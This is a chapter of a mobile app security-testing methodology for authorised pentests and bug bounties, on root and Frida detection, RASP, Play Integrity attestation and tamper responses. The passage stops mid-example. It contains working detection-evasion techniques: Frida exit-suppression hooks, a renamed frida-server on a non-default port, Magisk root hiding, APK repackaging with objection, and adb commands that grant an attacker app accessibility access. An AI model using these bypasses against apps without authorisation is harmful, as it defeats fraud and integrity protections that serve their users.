# D21 · Anti-Tampering, RASP, Root/Emulator Detection & Resilience

> This is the graveyard chapter. Every base observation it contains — "root detection is bypassable",
> "the app is not obfuscated", "Frida attaches", "the APK can be repackaged and re-signed" — is
> `lack_of_binary_hardening|*` at **P5** with an all-zero CVSS impact vector, and is excluded by name on
> HackerOne, Google Mobile VRP, Xiaomi, Grab, Spotify, Starbucks, PayPal, Basecamp, Snapchat, Reddit,
> HackenProof and YesWeHack. The chapter exists for the three things that are *not* in the graveyard:
> a **server** that makes a decision on a client-asserted integrity signal, an **attestation integration**
> that is unbound, unfresh or unverified, and a **tamper response** that an attacker can trigger against
> other users. Those reach `broken_access_control|privilege_escalation` (**VARIES**, argued High) and
> `application_level_denial_of_service_dos|critical_impact_and_or_easy_difficulty` (**P2**). Everything
> else in this domain is harness work — budget it, do not bill it.

| | |
|---|---|
| **Phases** | P4 static (detection-surface inventory, attestation call sites, obfuscation coverage, debug artefacts), P6 dynamic (control-vs-telemetry determination, fail-open probing, token replay/relay on the wire), P7 write-up (root-required payability gate, stock-device re-derivation) |
| **Milestones** | M4 primary; M3 (harness acceptance) and M6 (server-side trust) where the items cross over |
| **VRT ceiling** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269 — the server honouring a client-asserted integrity verdict, or a replayed/relayed attestation token, is the only shape in this domain that carries real severity); `application_level_denial_of_service_dos\|critical_impact_and_or_easy_difficulty` (**P2**) for an attacker-triggerable destructive tamper response; `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (**P1**) when the hook that nothing detected yields a shared credential. The domain's own nodes — `lack_of_binary_hardening\|lack_of_jailbreak_detection`, `\|lack_of_obfuscation`, `\|runtime_instrumentation_based`, `\|lack_of_exploit_mitigations` — are all **P5** and are never the headline |
| **Primary attacker model** | **AM-01 remote no interaction** and **AM-05 another user of the same app** — because the only payable shape is a *server* trusting a client claim, which any client can make. **AM-12 (your own rooted device) is not an attacker model**, and a finding whose entire PoC is "on my rooted phone I hooked a boolean" has no attacker. AM-03/AM-04 apply to the tamper-response and cloning items; AM-08 to the RASP-SDK supply-chain item |
| **Maps to** | MASVS-RESILIENCE-1/-2/-3/-4, MASVS-CODE-4; MASTG-TEST-0324, -0325, -0338, -0341, -0351, -0352, -0353, -0368, -0369, -0263, -0264, -0265 (deprecated: -0045, -0046, -0049, -0051); MASTG-TECH-0008, -0013, -0016, -0017, -0018, -0023, -0024, -0031, -0032, -0040, -0043, -0144, -0157, -0165; MASTG-KNOW-0027, -0028, -0030, -0031, -0032, -0033, -0034, -0035, -0036, -0044, -0118, -0119, -0120; MASTG-BEST-0007, -0029, -0030, -0041, -0046, -0047, -0066; MASTG-TOOL-0001, -0009, -0011, -0018, -0019, -0021, -0029, -0034, -0038, -0100, -0103, -0146, -0147, -0149, -0151, -0152, -0153; MASWE-0006, -0039, -0040, -0051, -0053, -0054, -0056, -0057, -0058, -0059, -0061, -0064; CWE-250, CWE-269, CWE-471, CWE-489, CWE-497, CWE-540, CWE-693, CWE-912, CWE-1295, CWE-1326; ATT&CK T1617, T1629, T1629.002, T1629.003, T1630.002, T1630.003, T1632, T1632.001, T1633, T1633.001, T1642, T1655.001, T1662, T1471, T1418.001, mitigations M1002, M1010, detection DET0687 |

## Why this domain pays

Mostly it does not, and the honest number is close to zero. Bugcrowd prices the entire
`lack_of_binary_hardening` family at **P5** with the baseline vector `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N`
— an all-None impact, which is Bugcrowd stating in machine-readable form that these are not
vulnerabilities. HackerOne's Core Ineligible Findings list carries "Lack of jailbreak detection in mobile
apps" under *Optional security hardening steps / Missing best practices*. Google's Mobile VRP lists
"Attacks that require a rooted device" as non-qualifying and its Invalid Reports page is blunter still:
"Rooted devices and emulators do not have the same security boundaries as regular devices. Bugs that only
occur when a device is rooted are not eligible." Xiaomi, Grab and Spotify carry the identical line about
"runtime hacking exploits using tools like but not limited to Frida/Appmon". PayPal excludes
"vulnerabilities requiring a rooted, jailbroken, or otherwise modified device". HackenProof qualifies it
usefully — "Root/Jailbreak Detection Bypass — **if the app doesn't promise root/jailbreak protection
explicitly**" — and that qualifier is the whole exception. AOSP's own severity-modifier table caps it
independently of any programme: "a local attack that requires the bootloader chain to be unlocked" and
"a local attack that requires Developer Mode to be currently enabled" are both **no higher than Low**.
MASVS says the quiet part out loud: "the absence of any MAS-R measures does not inherently introduce
vulnerabilities."

The exceptions are narrow, and they are all the same exception wearing different clothes: **the control
lives on the server, and the client is only a courier**. A rooted device sending `{"rooted":false}` and
getting a session is not a root-detection finding; it is a server trusting a client assertion, and it is
rated on what that assertion unlocks. A Play Integrity token replayed from a clean device to a rooted one,
or relayed alongside a different request body because `requestHash` was never bound, is not a RASP bypass;
it is a broken attestation integration that defeats the control for the entire user base — including users
who never rooted anything. A hardware key-attestation chain generated on a stock phone and injected into
an instrumented one passes every cryptographic check, because the claims are genuine for the oracle
device; the defect is that the backend treated a hardware-provenance proof as a session-binding proof.
Those findings survive triage because they need no root in the threat model: the attacker in the report
is a remote client, not a device owner. The second genuine exception is the destructive tamper response —
an app that wipes data, logs the account out permanently or locks the user when it thinks it has been
tampered with, where the trigger is a file any app can plant on shared storage. That is attacker-triggered
data destruction against arbitrary users, and it is the one item in this chapter with a Critical ceiling.

The third reason to walk the domain has nothing to do with filing it: **it is how you decide whether the
rest of the engagement is even possible**, and it is where negative findings are cheapest to write
defensibly. If the app's gate is a server-verified attestation, no local hook forges it and you should
stop burning hours on Frida and re-scope to server-side testing that day. If the app merely reports
signals to a backend and carries on when Frida attaches, the "protection" is telemetry, not a control,
and that sentence — with the evidence of the app running instrumented — is a clean ruled-out entry that
takes ten minutes. A consultancy caveat worth carrying: in a signed-SoW pentest, clients frequently buy
this domain explicitly. Cobalt's Harsh Bothra: *"I always raise my hands for SSL pinning and root
detection, because they (the client) always want it."* In that mode the resilience gap is a contractual
finding and belongs in the report. In a bug-bounty submission the same text gets closed as informative.
Decide which mode you are in before you write a word — that is item D21-001.

## The crux question

**Does any decision that matters get made off this device on the strength of something this device
claimed — and if so, is that claim an opaque, server-verified, freshly-bound attestation, or a boolean
the client chose?**
If the honest answer is "the check only stops the device's own owner from seeing their own data", you have
a P5 hardening observation, and the correct output is a ruled-out entry, not a report.

## Triage order

1. **Is MAS-R contractually in scope?** One question to the client. It decides whether half this chapter
   is a deliverable or a waste, and getting it wrong is the single most expensive mistake in the domain.
2. **Is an integrity/RASP gate blocking the dynamic phase at all?** If yes, negotiate it at Gate 1 rather
   than burning days on it later; the RoE option you pick changes how every later finding must be worded.
3. **Does an opaque attestation token cross the wire?** One look at the proxy separates the whole payable
   half of this domain from the whole graveyard half. No token and a `{"rooted":false}` field means the
   control is client-side; an opaque token means go and test the *integration*.
4. **Strip the attestation token/header and replay.** Cheapest high-value test here. Apply the body-diff
   and layer-ordering gates before believing the 200 (D21-012) — a status-code-only claim is the most
   commonly rejected shape on every platform.
5. **Replay one valid token against a second action, a second account and a later timestamp.** Needs no
   device bypass at all, and it is the finding that survives any amount of client-side hardening.
6. **Does the app still ship SafetyNet Attestation?** Dead API since January 2025; if the failure branch
   allows, the gate has been unconditionally open in production for over a year.
7. **Does the tamper response destroy or lock anything?** Look for `wipeData`, `lockNow`,
   `clearApplicationUserData` near the detection code before anything else — the ceiling here is P2 and
   nobody checks it.
8. **Control or telemetry?** Attach and drive the app. If it runs normally, everything downstream in this
   chapter is a ruled-out entry and you have your negative for free.
9. **Fail-open probing before bypass work.** Make the detection *throw*, do not neutralise it; a broad
   `catch` around the check is a defect the vendor can fix, and a bypass is not.
10. **Hook the secret-handling APIs.** If hook detection is absent, the deliverable is the extracted token
    or key — a D13/D15 finding with a D21 method — never "hooks worked".
11. **Debug artefacts in the release build.** `android:debuggable`, `setWebContentsDebuggingEnabled`, a
    surviving debug menu. These are the items in this chapter that genuinely rate on their own.
12. **Obfuscation, last and only for what it reveals.** The fraud threshold, the allowlisted account ids
    and the detection scope you read out of the decompile are the finding; the absence of R8 is not.

## Items

### D21-001 · Settle the engagement mode before writing a single resilience line

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (governs whether every other item in this chapter is a deliverable or a waste) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASVS-RESILIENCE (whole group); Bugcrowd VRT `lack_of_binary_hardening\|*` (P5); HackerOne Core Ineligible Findings |

- **Test:** The same observation is a paid contractual finding in a signed-SoW pentest and an
  auto-closed informative on a bounty platform. Write the engagement type as the first line of the notes
  before any tooling runs.
- **How:** Read the brief for the tell, then record it verbatim in the methodology section.
```
"in scope / out of scope / safe harbor"          -> bug bounty   -> MAS-R is P5, do not file
"compliance / executive report / remediation"    -> WAPT / SoW   -> MAS-R is a deliverable
"kill chain / objectives / adversary emulation"  -> red team     -> defensive-state notes are deliverables
mixed or unstated                                -> default to bug-bounty discipline (strictest)
```
  Then check the programme text for the qualifier that reopens the domain:
```
HackenProof: "Root/Jailbreak Detection Bypass - If the app doesn't promise root/jailbreak
              protection explicitly."
```
  If the vendor's own marketing, app-store listing or documentation *promises* rooted-device protection,
  quote that sentence in the report next to your artefact — that is the "control defeat" condition.
- **Proof:** A one-line mode declaration in the notes, plus (for a SoW engagement) the SoW clause that
  buys MAS-R quoted verbatim, or (for a bounty) the programme's exclusion clause quoted verbatim.
- **Escalation:** Nothing. This item exists to stop or to authorise filings, not to produce one.
- **Ruled out when:** The brief explicitly scopes MAS-R / MASVS-RESILIENCE, in which case every item in
  this chapter is reportable at its stated ceiling as a hardening gap, and the graveyard table below does
  not apply. Record the clause; never infer scope from silence.

### D21-002 · The six-condition gate every root-required observation must pass before it is filed

| | |
|---|---|
| **Severity ceiling** | Support (it sets the severity of the finding it gates) |
| **VRT** | n/a (a filing gate) |
| **Attacker** | AM-12 on input; the gate's job is to convert it to AM-01/AM-03/AM-05 or kill it |
| **Applies to** | every finding whose PoC required root, Frida, a patched APK or a debuggable build |
| **Maps to** | Google Mobile VRP non-qualifying "Attacks that require a rooted device"; HackerOne Core Ineligible; Bugcrowd `lack_of_binary_hardening\|lack_of_jailbreak_detection` (P5) |

- **Test:** A root-required observation is reportable only if you can additionally demonstrate at least
  **one** of six conditions, with an artefact. Run this before writing, not after rejection.
- **How:**
```
1. NON-ROOT REACH   - a zero-permission app, a deep link, a backup or an exported component reaches the
                      same data/behaviour.            Evidence: the non-root PoC.
2. SERVER TRUST     - the server accepts the value you changed.
                      Evidence: 200 + the changed effect, replayed with curl outside the app.
3. CROSS-USER       - the impact lands on another account/user/profile.
                      Evidence: victim-side capture.
4. PERSISTENCE      - it survives reinstall/backup/device transfer.   Evidence: restore then re-read.
5. CONTROL DEFEAT   - it defeats a control the vendor sells or claims (attestation, app lock,
                      "we never store X").            Evidence: the marketing/doc claim beside the artefact.
6. LOCAL-ONLY CRED  - the extracted value authenticates OTHER users (shared API key, HMAC key, symmetric
                      key baked into the APK).        Evidence: the key used from your own machine
                      against a second account.
```
  The two most often skipped are 2 and 6; run them mechanically:
```bash
# (2) prove the server, not the client, is the control
curl -i -X POST https://api.target/v1/entitlement -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d '{"tier":"premium","source":"client"}'

# (6) prove the extracted key is not per-device
adb -s deviceA shell run-as com.target.app cat files/key.bin | xxd | head
adb -s deviceB shell run-as com.target.app cat files/key.bin | xxd | head   # identical => shared
```
- **Proof:** The gate artefact itself, pasted into the report *before* the extraction narrative. A report
  that opens with "on a rooted device I extracted X" and never presents one of the six is the report that
  gets closed as informative.
- **Escalation:** Condition 2 is the one that converts most "client-side" observations into paid
  server-side findings -> D15 backend authz. Condition 6 converts a local extraction into
  `sensitive_data_exposure|disclosure_of_secrets|for_publicly_accessible_asset` (P1) -> D12/D18.
- **Ruled out when:** You ran all six and none holds — the extracted value is per-device, the server
  re-derives the decision, the data is the device owner's own, and nothing persists past a wipe. Write
  that sentence into the ruled-out register with the two `xxd` outputs and the curl response; it is a
  defensible negative, and it is the correct output for most of this chapter.

### D21-003 · Settle the integrity blocker in the RoE at Gate 1, and read the verdict the app actually gets

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | any app with Play Integrity, SafetyNet remnants or a commercial RASP SDK |
| **Maps to** | Play Integrity device-integrity labels `MEETS_DEVICE_INTEGRITY`, `MEETS_BASIC_INTEGRITY`, `MEETS_STRONG_INTEGRITY`, `MEETS_VIRTUAL_INTEGRITY` |

- **Test:** If the app hard-fails on a rooted or emulated device, the whole dynamic phase is blocked on
  day one. Treat that as a commercial precondition to be negotiated and priced, not a puzzle to solve
  silently.
- **How:** Pick one of four options at Gate 1, in this order of preference, and write the choice into the
  RoE and the report's methodology section:
```
1  Client supplies a build with integrity/RASP gates disabled by flag  (best: all other behaviour intact)
2  Client allow-lists the lab device/account server-side               (verdict soft-failed for that account)
3  Tester bypasses the gate; method, hours and RESIDUAL RISK documented
4  Stock Play-certified device for the gated flows + a rooted lane for everything else
```
  Then verify which verdict the app is actually receiving rather than assuming:
```bash
adb logcat -c; adb shell monkey -p com.target.app 1 >/dev/null 2>&1; sleep 15
adb logcat -d | grep -iE 'integrity|deviceRecognitionVerdict|MEETS_(DEVICE|BASIC|STRONG|VIRTUAL)_INTEGRITY|attest|safetynet|rasp|rooted'
```
  A rooted device or an unsupported emulator returns an **empty** device-recognition verdict — an empty
  field is a result, not a failure to read one.
- **Proof:** Either an integrity-relaxed build installed and running, or the logged verdict string, or a
  documented bypass with its Frida/smali artefact filed in the evidence tree.
- **Escalation:** If option 3 succeeds *end-to-end* — the server accepts requests that carry no integrity
  verdict at all — that is a separate, reportable server-side finding: the client paid for a control that
  is client-side only. -> D21-013, D21-015.
- **Ruled out when:** The app is installed and every gated flow completes on the lab device with the gate
  intact (option 1 or 2 in force), so no finding in the report was demonstrated behind a disabled control.
  State that explicitly — option 1/2 findings are cleaner precisely because the control was never in the
  path.

### D21-004 · Inventory every defence before hooking one

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0165, MASTG-TOOL-0009 (APKiD `anti_root` / `anti_vm` / `obfuscator` / `packer`), MASTG-TOOL-0146 (RootBeer), MASTG-TOOL-0147 (Android RASP), MASTG-KNOW-0027, MASTG-KNOW-0030 |

- **Test:** Checks are scattered across an obfuscated utility class, a vendor SDK **and** a native
  library. Stubbing one of four produces a silent bail-out you will misdiagnose as an app bug and write up
  as "the app is stable under instrumentation".
- **How:** Build the complete check-site inventory first.
```bash
apkid target.apk                                  # anti_root / anti_vm / obfuscator / packer, per library
grep -rn '/system/xbin/su\|/system/bin/su\|/sbin/su\|Superuser.apk\|busybox\|magisk\|Magisk' jadx_out/sources
grep -rn 'Runtime.getRuntime().exec\|ProcessBuilder' jadx_out/sources
grep -rn 'ro.build.tags\|test-keys\|ro.debuggable\|ro.secure\|SystemProperties.get' jadx_out/sources
grep -rn 'isDeviceRooted\|checkRootMethod\|RootBeer\|SafetyNet\|IntegrityManager\|attest' jadx_out/sources
grep -rn 'getInstallerPackageName\|getInstallSourceInfo\|signatures\|GET_SIGNING_CERTIFICATES' jadx_out/sources
strings out/lib/arm64-v8a/*.so | grep -iE 'busybox|magisk|superuser|/su$|frida|gum-js|xposed|ptrace|TracerPid'
# vendor fingerprint - which commercial RASP is this?
for so in out/lib/*/*.so; do strings -a "$so" \
  | grep -aoiE 'guardsquare|dexguard|appdome|promon|shield|verimatrix|talsec|freerasp' \
  | head -1 | sed "s#^#$so: #"; done
```
  Rule-based smali triage that requires the suspicious string to sit near the API that consumes it — this
  is what removes the false positives a bare string grep produces:
```json
{ "category": "root_check",
  "regex_patterns": [
    "(?i)invoke-static .*Runtime;->getRuntime\\(\\).*->exec\\(.*\"(su|magisk|busybox)\"",
    "(?i)const-string [vp0-9, ]+\"(/system/xbin/su|/system/bin/su|/sbin/su)\""],
  "context_hint": "Only report when the same method also calls File;->exists/canExecute or Runtime;->exec." }
```
  If the app dies before your hooks land, dump what actually loaded:
```javascript
Java.perform(() => Java.enumerateLoadedClasses({ onMatch: n => console.log(n), onComplete: () => console.log('Done') }));
```
- **Proof:** A named, complete check-site list — class, method and native symbol per check — produced
  before the first hook. The 2016 su/busybox/test-keys triad is the **floor**, not the ceiling: modern
  builds add Magisk/Zygisk artefacts, Frida port 27042, `gum-js-loop`, `/proc/self/maps` scans, and
  native-side `ptrace`/`TracerPid` reads.
- **Escalation:** The inventory is the input to D21-005 (control or telemetry), D21-033 (what does each
  check gate) and D21-051 (which of these routines survived obfuscation).
- **Ruled out when:** APKiD returns no `anti_root`/`anti_vm` signature, no vendor string matches in any
  `.so`, and none of the greps hits outside third-party analytics code — the app ships no resilience
  controls at all. Note it as a fact, then file nothing: "no root detection" is
  `lack_of_binary_hardening|lack_of_jailbreak_detection` (P5).

### D21-005 · Control or telemetry? Decide it by running the app, not by reading the code

| | |
|---|---|
| **Severity ceiling** | Support (it is the ruled-out entry for most of this chapter) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0118 (RASP), MASWE-0058 |

- **Test:** Most commercial RASP SDKs *report* signals to a backend and never block anything. A signal
  that reaches analytics is telemetry; a signal that changes what the app or the server will do is a
  control. Only a control can be bypassed, and only a bypassed control can be a finding.
- **How:** Attach and drive the app through its most sensitive flow with hooks live, then look for the
  three possible outcomes rather than the two people expect.
```bash
frida -U -n com.target.app -l noop.js        # attach AFTER the UI loads; no spawn-time race
# watch all three channels at once
adb logcat --pid=$(adb shell pidof -s com.target.app) | grep -iE 'tamper|integrity|root|hook|rasp|threat'
```
  In the proxy, watch for a *new* request that only appears while instrumented — a threat/telemetry beacon
  — and for a *changed* response to a normal request.
```
outcome A  app exits / flow refuses               -> a control. Go to D21-033.
outcome B  app runs, a beacon fires, nothing else -> telemetry. Ruled out; say so in one sentence.
outcome C  app runs, no beacon, nothing changes   -> no control at all. Graveyard (P5).
```
- **Proof:** For B, the beacon request captured in the proxy with the app still functioning normally
  afterwards — plus the absence of any server-side behaviour change on the next sensitive call. For C, the
  app functioning under instrumentation with no beacon and no logcat line.
- **Escalation:** Outcome B is a legitimate *report sentence* in a SoW engagement ("the purchased control
  is a reporting integration, not an enforcement point") and a ruled-out entry in a bounty. Outcome A
  feeds D21-033, D21-034 and D21-039.
- **Ruled out when:** Outcome B or C, recorded with the artefact. This is the single highest-value
  negative in the chapter: it closes root detection, Frida detection, emulator detection and tamper
  detection in one paragraph, defensibly.

### D21-006 · The attestation consumption fork: does an opaque token actually reach the server?

| | |
|---|---|
| **Severity ceiling** | Support (it routes the whole payable half of the chapter) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | any app referencing Play Integrity, SafetyNet or Android key attestation |
| **Maps to** | MASTG-KNOW-0035, MASWE-0054, MASWE-0056; Play Integrity documentation ("token verification must occur on your backend server, not on the client app") |

- **Test:** One observation splits this domain in half. Either the app forwards an **opaque token** that
  the backend decrypts and verifies — in which case no local hook forges it and you should test the
  *integration* (D21-014 to D21-020) — or the app parses a verdict locally and sends a boolean, in which
  case the control is client-side and D21-013 is your finding.
- **How:**
```bash
grep -rnE 'IntegrityManager|StandardIntegrityManager|IntegrityTokenRequest|StandardIntegrityTokenRequest|requestIntegrityToken|setNonce\(|setRequestHash\(|decodeIntegrityToken|integrityToken' sources/
grep -rnE 'setAttestationChallenge\(|getCertificateChain\(|KeyStore\.getInstance\("AndroidKeyStore"\)' sources/
```
  Then read the wire. Sweep every request body and header for the two shapes:
```bash
mitmdump -nr traffic.flows -s /dev/stdin <<'PY'
def request(f):
    b = (f.request.content or b'').lower()
    for k in (b'integrity', b'attestation', b'rooted', b'jailbroken', b'isemulator', b'tampered',
              b'devicesafe', b'devicetrusted'):
        if k in b:
            print(f.request.pretty_host, f.request.path[:70], k.decode())
    for h in f.request.headers:
        if 'integrity' in h.lower() or 'attest' in h.lower():
            print('HDR', h, f.request.headers[h][:40])
PY
```
- **Proof:** Either a long opaque base64 blob (a token, sometimes >2 KB) on sensitive requests, or a short
  JSON field such as `"deviceIntegrity":"OK"` / `"rooted":false` / `"hardwareBacked":true`. The two are
  visually unmistakable and the distinction is the entire finding tree.
- **Escalation:** Token present -> D21-015 to D21-020 (integration tests, all of which are High).
  Boolean present -> D21-013. Neither present, on an app that *does* call the API -> the verdict never
  leaves the device (D21-014).
- **Ruled out when:** No attestation API is referenced anywhere in the app and no integrity-shaped field
  or header appears on any request. The app makes no device-integrity claim; "no attestation implemented"
  is MASWE-0054/-0056 as a hardening gap and is **not** a bounty finding — do not file it.

### D21-007 · Distinguish "the app detected you" from "your hook was wrong"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | Frida `Java.use` on `java.lang.System` / `android.os.Process`; `Log.getStackTraceString` |

- **Test:** When the app exits or degrades under instrumentation there are two explanations, and testers
  routinely write up the wrong one. Prove which before claiming "strong RASP" or "the app blocks Frida".
- **How:** Run *observation* hooks, not bypass hooks, and capture the stack at the moment of death.
```javascript
Java.perform(function () {
  var Sys = Java.use('java.lang.System');
  Sys.exit.implementation = function (c) {
    console.log('[System.exit] code=' + c);
    console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    // deliberately do NOT call through - keep the process alive to read the stack
  };
  var Proc = Java.use('android.os.Process');
  Proc.killProcess.implementation = function (p) {
    console.log('[Process.killProcess] ' + p);
    console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
  };
});
```
  If Java hooks never fire, follow the native trail before concluding anything:
```bash
frida-trace -U -n com.target.app -i "JNI_OnLoad" -i "ptrace" -i "fork"
adb logcat -d | grep -iE 'SIGSEGV|abort|Fatal signal|tombstone'
```
- **Proof:** A stack trace naming the detection class and method at the moment of exit. If no such trace
  appears and the process simply never reaches your hook, you are in the late-attach / abstract-class /
  inlining case, not a detection — go and fix the hook.
- **Escalation:** A named detection routine -> a targeted single-method bypass (D21-004 inventory) instead
  of a shotgun script that causes its own crashes.
- **Ruled out when:** The trace shows `System.exit` called from an app crash handler, an ANR, or a
  third-party analytics SDK rather than a detection routine — the app did not detect you. Record the
  trace; a fabricated "the app has strong RASP" line is a false statement in a report and is worse than no
  statement.

### D21-008 · Detection that only runs at process spawn

| | |
|---|---|
| **Severity ceiling** | Support (a resilience note in a SoW engagement) |
| **VRT** | `lack_of_binary_hardening\|runtime_instrumentation_based` (P5) |
| **Attacker** | AM-12 — i.e. not an attacker |
| **Applies to** | all hardened apps |
| **Maps to** | MASTG-TECH-0043, MASTG-KNOW-0030 |

- **Test:** Many checks execute only during spawn or `Application.onCreate()`. Spawn-time injection
  (`-f`) and gadget builds get caught; attaching after the UI has loaded slips straight past.
- **How:**
```bash
# launch normally from the launcher or adb, wait for the UI, then attach
adb shell monkey -p com.target.app 1 >/dev/null 2>&1; sleep 6
frida -U -n com.target.app -l hooks.js
# contrast with the spawn path that failed
frida -U -f com.target.app -l hooks.js --no-pause
```
  If you genuinely need hooks before `onCreate`, use consolidated spawn-mode tooling so each Java method
  and native symbol is hooked exactly once — overlapping hooks are their own crash source.
- **Proof:** The app running stably with instrumentation attached where `-f` previously exited, and the
  two command lines side by side.
- **Escalation:** Unblocks every dynamic item in D10-D15 against a hardened target. In a SoW report this
  is a legitimate resilience observation: continuous re-verification is absent.
- **Ruled out when:** Late attach is detected too — the observation hooks from D21-007 fire on a
  post-UI attach — meaning the app re-checks during its lifecycle. That is the correct behaviour and
  belongs in the report's positive-observations section.

### D21-009 · Enumerate which Frida fingerprints the app greps for, then defeat exactly those

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `lack_of_binary_hardening\|runtime_instrumentation_based` (P5) |
| **Attacker** | AM-12 |
| **Applies to** | hardened banking, wallet and identity apps |
| **Maps to** | MASTG-KNOW-0030 (Reverse Engineering Tool Detection), MASTG-TOOL-0021 (Magisk + Zygisk/DenyList), MASTG-TOOL-0149 (LSPosed) |

- **Test:** Anti-Frida detection is a fixed list of artefacts. Enumerate the list from the binary rather
  than guessing, so the bypass is targeted and you can state precisely which vectors the app does and does
  not cover.
- **How:**
```bash
grep -rn -i 'frida\|gum-js-loop\|gmain\|gdbus\|pool-spawner\|linjector\|re\.frida\.server\|27042\|27047\|LIBFRIDA' \
  jadx_out/sources out/lib/*/*.so
```
  Vectors a modern detector covers, and which a renamed/stealth server changes: process name
  `frida-server`; the mapped `libfrida-agent.so`; thread names `gmain` / `gdbus` / `pool-spawner`; the
  memfd label; the exported `frida_agent_main` symbol; SELinux label `frida_file`; the D-Bus service
  `re.frida.server`; the default listening port; libc `exit`/`signal` hook side-effects; temp paths
  `.frida` / `frida-`. The three cheap countermeasures, in cost order:
```bash
# 1. non-default port
adb shell "/data/local/tmp/frida-server -l 0.0.0.0:31337 &"
frida -H 127.0.0.1:31337 -n com.target.app
# 2. renamed binary (process-name detection)
adb push frida-server /data/local/tmp/fs && adb shell "chmod 755 /data/local/tmp/fs && /data/local/tmp/fs &"
# 3. gadget instead of server (memory-scan detection for the server's own strings)
frida --gadget=libgadget.so -f com.target.app
```
  Ladder for root-hiding, cheapest first: Magisk Zygisk + DenyList with the package added and a reboot;
  then Shamiko; then KernelSU/APatch (no Zygote injection at all) for apps that heuristically detect
  Zygisk. Note MASTG's caveat for the report: Magisk DenyList is **not** kernel-level process hiding — it
  is mount-namespace plus Zygote isolation per app.
- **Proof:** The app that previously exited on injection now runs instrumented, with the specific
  fingerprint you neutralised named.
- **Escalation:** Harness only. -> D10-D15. Never a finding on its own — VRT P5.
- **Ruled out when:** The app is still detected after port, name, gadget and Zygisk-hiding changes, and
  the D21-007 trace names a native routine. That is a genuinely hardened target; record the cost in hours
  in the RoE (D21-003 option 3) rather than continuing indefinitely.

### D21-010 · Re-derive every finding on a stock device before writing it up

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (payout precondition) |
| **Attacker** | converts AM-12 to AM-01/AM-03 |
| **Applies to** | all |
| **Maps to** | Google's reporting guidance (device model/Android version/build number in the report **text**, not a screenshot); AOSP severity modifiers (unlocked bootloader / Developer Mode -> no higher than Low) |

- **Test:** Keep two devices: a rooted analysis device and a stock verification device. Every candidate
  finding is re-run on the latter before a word of the report is written.
- **How:**
```bash
adb install poc.apk
adb shell getprop ro.build.tags          # expect release-keys
adb shell 'which su || echo "no su"'
adb shell getprop ro.product.model; adb shell getprop ro.build.version.release; adb shell getprop ro.build.display.id
```
  If a programme forbids rooted-device evidence entirely, use the gadget-patch path so the PoC runs on a
  stock handset:
```bash
pip3 install objection
objection patchapk -s com.target.app
adb install <path to .objection apk>
objection -g com.target.app explore -q
```
  Note the trade-off: a patched, re-signed build fails signature and attestation checks that a rooted
  device with frida-server passes — pick the harness that matches what you need to prove.
- **Proof:** Evidence captured on the stock device, with model, Android version and build number recorded
  as text. The model sentences to copy: "This action does not require root priv." and "No special
  permission or root required. No user interactions and awareness."
- **Escalation:** This is what converts a D11/D12/D15 finding from "requires root" (closed) to "any
  client" (paid).
- **Ruled out when:** The finding genuinely cannot be reproduced without root and none of the D21-002 six
  conditions holds. Then it is not a finding — put it in the ruled-out register with the stock-device
  attempt recorded, not in the report.

### D21-011 · State every precondition the PoC needed, including the ones that lower your severity

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Android 13+ for restricted settings; all for the rest |
| **Maps to** | Android restricted-settings behaviour ("Allow restricted settings", Android 13+); Google's reporting guidance on non-standard device configurations; AOSP severity modifiers |

- **Test:** Omitting a precondition inflates severity and gets the whole report downgraded when the
  triager finds it. List them, in the report, above the reproduction steps.
- **How:** The preconditions that materially change exploitability, and how to demonstrate each:
```bash
# accessibility / notification-listener PoCs on Android 13+ hit the restricted-settings gate
adb install -r attacker.apk
adb shell cmd notification allow_listener com.attacker/.Listener
adb shell settings put secure enabled_accessibility_services com.attacker/.A11y
adb shell settings get secure enabled_accessibility_services
# on a real device, record the "Restricted setting" dialog and the
# Settings > Apps > [app] > More > Allow restricted settings path, and COUNT THE TAPS
adb shell getprop ro.boot.verifiedbootstate     # green/orange/yellow: bootloader state
adb shell settings get global development_settings_enabled
```
- **Proof:** A screen recording of the restricted-settings gate and the number of user taps required;
  plus a precondition block in the report listing root/no-root, developer mode, bootloader state,
  installed helper apps, and any permission the attacker app holds.
- **Escalation:** -> D27 severity justification. Conversely, a PoC that needs *none* of these is the
  strongest severity argument you can make, and it should be the first line of the report.
- **Ruled out when:** The chain requires two or more simultaneous user-granted preconditions (for example
  sideload **and** enable an accessibility service **and** clear the restricted-settings gate). Per
  kill-fast discipline, more than two simultaneous preconditions is a kill, not a downgrade.

### D21-012 · Apply the body-diff and layer-ordering gates to every "I stripped the token and got 200"

| | |
|---|---|
| **Severity ceiling** | Support (it is the kill gate for this chapter's best finding class) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every attestation-stripping or verdict-flipping claim in this chapter |
| **Maps to** | the Body-Diff Rule, the Layer-Ordering Trap and the Statistical-Sample Rule from the bug-hunting corpus |

- **Test:** Three false positives dominate this domain's payable half, and all three look like a bypass.
  Run the controls before the claim leaves your notes.
- **How:**
```bash
# 1. BODY DIFF - a byte-identical 200 is not a bypass
curl -s -H "Authorization: Bearer $TOK" -H "X-Integrity-Token: $GOOD" \
     https://api.target/v1/transfer -d @body.json > /tmp/baseline
curl -s -H "Authorization: Bearer $TOK" \
     https://api.target/v1/transfer -d @body.json > /tmp/stripped
